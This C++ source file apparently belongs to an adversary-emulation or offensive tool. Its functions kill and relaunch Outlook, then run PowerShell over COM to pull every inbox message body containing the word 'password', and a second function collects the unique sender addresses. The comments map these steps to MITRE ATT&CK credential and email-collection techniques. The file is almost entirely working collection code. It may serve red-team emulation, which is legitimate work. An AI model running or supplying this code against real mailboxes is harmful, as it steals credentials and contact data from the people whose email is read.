#include "pch.h"
#include "outlook.h"

using namespace std;

/*
 * executeCmd: Execute given command and retrieve output from stdout
 *		   Src: https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po
 */
string executeCmd(const char* cmd) {
	array<char, 128> buffer;
	string result = "";
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		printf("Unable to start pipe\n");
		return result;
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}

/*
 * stopOutlook: Stops Outlook if it is running
 */
BOOL stopOutlook() {
	string powershellCMD = "";
	powershellCMD += "powershell -Command \"$outlook = Get-Process outlook -ErrorAction SilentlyContinue;";
	powershellCMD += "if ($outlook) { $outlook | Stop-Process | Start-Sleep -s 5 };\"\0";
	const char* command = powershellCMD.c_str();
	string result = executeCmd(command);
	if (result.empty()) return true;
	return false;
}

/*
 * startOutlook: Starts Outlook 
 */
BOOL startOutlook() {
	string powershellCMD = "";
	powershellCMD += "powershell -Command \"Start-Process -FilePath \\\"outlook\\\"; Start-Sleep -s 5;\"\0";
	const char* command = powershellCMD.c_str();
	string result = executeCmd(command);
	cout << result << endl;

	if (result.empty()) return true;

	return false;
}

 /*
  * getCredentials:
  *		About:
  *			Execute PowerShell command to retrieve emails with the word "password" in them
  *		Result:
  *			Writes PowerShell output to given memory space, return true if it was able to
  *		MITRE ATT&CK Techniques:
  *			T1114.001: Email Collection: Local Email Collection
  *			T1552: Unsecured Credentials
  *		Source:
  *			PowerShell code inspired from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1
  */
BOOL getCredentials(char* result_c, int length, bool stop, bool restart) {
	// Stop outlook depending on argument
	if (stop && !stopOutlook()) return false;

	// Restart Outlook Application depending on argument
	// with same IL as running process
	if (restart && !startOutlook()) return false;

	// Retrieves credentials from outlook
	string powershellCMD = "";
	powershellCMD += "powershell -Command \"Add-type -assembly \\\"Microsoft.Office.Interop.Outlook\\\" | out-null;";
	powershellCMD += "$olFolders = \\\"Microsoft.Office.Interop.Outlook.olDefaultFolders\\\" -as [type];";
	powershellCMD += "$outlook = new-object -comobject outlook.application;";
	powershellCMD += "$namespace = $outlook.GetNameSpace(\\\"MAPI\\\");";
	powershellCMD += "$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);";
	powershellCMD += "($folder.items | Select-Object -ExpandProperty Body | Select-String \\\"password\\\") -replace \'\\s+\', \' \' -join \';\';\"\0";

	const char* command = powershellCMD.c_str();
	string result = executeCmd(command);
	if (length < result.length()) return false;
	strncpy_s(result_c, length, result.c_str(), length);
	return true;
}

/*
 * getEmailAddresses: 
 *		About: 
 *			Execute PowerShell command to retrieve unique email addresses
 *		Result:
 *			Writes PowerShell output that has unique email addresses, return true if it was able to
 *		MITRE ATT&CK Techniques:
 *			T1114.001: Email Collection: Local Email Collection
 *		Source:
 *			PowerShell code inspired from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1
 */
BOOL getEmailAddresses(char *result_c, int length, bool stop, bool restart) {
	// Stop outlook depending on argument
	if (stop && !stopOutlook()) return false;

	// Restart Outlook Application depending on argument
	// with same IL as running process
	if (restart && !startOutlook()) return false;

	// Retrieves email addresses from outlook
	string powershellCMD = "";
	powershellCMD += "powershell -Command \"Add-type -assembly \\\"Microsoft.Office.Interop.Outlook\\\" | out-null;";
	powershellCMD += "$olFolders = \\\"Microsoft.Office.Interop.Outlook.olDefaultFolders\\\" -as [type];";
	powershellCMD += "$outlook = New-Object -comobject outlook.application; ";
	powershellCMD += "$namespace = $outlook.GetNameSpace(\\\"MAPI\\\");";
	powershellCMD += "$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);";
	powershellCMD += "($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join \';\';\"\0";

	const char* command = powershellCMD.c_str();
	string result = executeCmd(command);
	if (length < result.length()) return false;
	strncpy_s(result_c, length, result.c_str(), length);
	return true;
}